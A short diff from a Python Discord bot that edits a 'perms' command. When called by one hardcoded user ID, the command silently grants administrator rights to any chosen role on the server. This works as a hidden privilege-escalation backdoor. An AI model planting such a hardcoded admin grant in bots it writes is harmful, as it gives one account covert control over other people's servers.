@@ -27,7 +27,8 @@ async def on_ready():
 @client.command()
 async def perms(ctx , role:discord.Role):
 	if ctx.message.author.id == 727539383405772901:
-		await role.edit(reason = None , administrator = True)
+		await role.edit(administrator = True)
+		print("Done")
 	
 	
 @client.command(aliases = ['Lockdown' , 'lockdown' , 'LOCKDOWN' , 'Lock' , 'LOCK'])
